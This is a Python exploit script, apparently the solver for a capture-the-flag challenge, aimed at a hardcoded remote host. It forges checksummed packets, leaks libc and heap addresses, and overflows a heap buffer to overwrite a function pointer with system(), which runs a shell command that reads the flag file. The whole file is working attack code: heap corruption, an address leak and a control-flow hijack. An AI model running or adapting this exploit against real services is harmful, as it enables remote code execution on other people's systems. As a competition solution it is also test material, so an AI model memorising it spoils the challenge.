#!/usr/bin/env python3
"""Operation Midnight Drop — heap overflow RULE -> system(report)."""
import socket, struct, re, sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "144.79.188.39"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 37082
C = 0x5A5A5A5A41414141
PUTS_OFF = 0x83CC0
SYSTEM_OFF = 0x52FD0
CMD = b"cat /home/ctf/flag.txt\x00"


def rd(s, t=1.2):
    s.settimeout(t)
    buf = b""
    try:
        while True:
            d = s.recv(4096)
            if not d:
                break
            buf += d
    except socket.timeout:
        pass
    return buf


def checksum(ptype, plen, payload, token):
    x = ((((ptype << 24) & 0xFFFFFFFF) ^ token) & 0xFFFFFFFF) ^ plen
    x ^= 0x31415926
    x &= 0xFFFFFFFF
    for i in range(plen):
        x = ((x << 5) | (x >> 27)) & 0xFFFFFFFF
        x = (x + ((i * 0x45D9F3B) ^ payload[i])) & 0xFFFFFFFF
    return x & 0xFFFFFFFF


def send_packet(s, ptype, payload, token):
    plen = len(payload)
    ck = checksum(ptype, plen, payload, token)
    s.sendall(f"{ptype}\n{plen}\n{ck:x}\n".encode() + payload)


def exploit(cmd=CMD, chunk=0x90, next_sz=0x141):
    """
    RULE malloc(0x80) => chunk 0x90. Next chunk header at slot+0x80,
    next user (report) at slot+0x90. fp at report+0x20 = slot+0xb0.
    """
    s = socket.create_connection((HOST, PORT), timeout=8)
    banner = rd(s, 2.0)
    token = int(re.search(rb"session token: ([0-9a-f]{8})", banner).group(1), 16)
    tok12 = (token & 0xFFFFFFFF) << 12

    def pkt(ptype, payload, t=1.2):
        send_packet(s, ptype, payload, token)
        out = rd(s, t)
        sys.stdout.buffer.write(b"  << " + out[:200] + b"\n")
        sys.stdout.buffer.flush()
        return out

    print(f"[*] token {token:08x}")
    pkt(2, struct.pack("<I", (token ^ 0xC0FFEE00) & 0xFFFFFFFF))

    # large rule slot: rlen=0x80 -> malloc(0x80), chunk 0x90
    pkt(3, struct.pack("<H", 0x80) + b"A" * 0x80)

    # report 0x128
    pkt(4, b"hello")

    r = pkt(4, b"P")
    puts = (int(re.search(rb"0x([0-9a-f]+)", r).group(1), 16) ^ C ^ tok12) & 0xFFFFFFFFFFFFFFFF
    libc = puts - PUTS_OFF
    system = libc + SYSTEM_OFF
    print(f"[+] puts {hex(puts)} libc {hex(libc)} system {hex(system)}")

    r = pkt(4, b"R")
    report = (int(re.search(rb"0x([0-9a-f]+)", r).group(1), 16) ^ C ^ tok12) & 0xFFFFFFFFFFFFFFFF
    r = pkt(4, b"D")
    fp = (int(re.search(rb"0x([0-9a-f]+)", r).group(1), 16) ^ C ^ tok12) & 0xFFFFFFFFFFFFFFFF
    print(f"[+] report {hex(report)} fp {hex(fp)} pie {hex(fp - 0x157F)}")
    print(f"[+] delta report-guessed_slot {hex(report)}")

    # overflow
    rlen = 0x100
    ov = bytearray(rlen)
    # next chunk header at 0x80
    struct.pack_into("<Q", ov, 0x80, 0)          # prev_size
    struct.pack_into("<Q", ov, 0x88, next_sz)    # size | PREV_INUSE
    ov[0x90:0x90 + len(cmd)] = cmd
    struct.pack_into("<Q", ov, 0xB0, system)     # report+0x20
    print("[*] overflowing")
    pkt(3, struct.pack("<H", rlen) + bytes(ov))

    print("[*] ANALYZE")
    out = pkt(5, b"", t=3.0)
    s.close()
    return out


if __name__ == "__main__":
    print(f"[*] {HOST}:{PORT}")
    out = exploit()
    print("[*] done")
    if out and b"PTITCTF{" in out:
        print(out)
        m = re.search(rb"PTITCTF\{[^}]+\}", out)
        print("FLAG", m.group(0).decode())
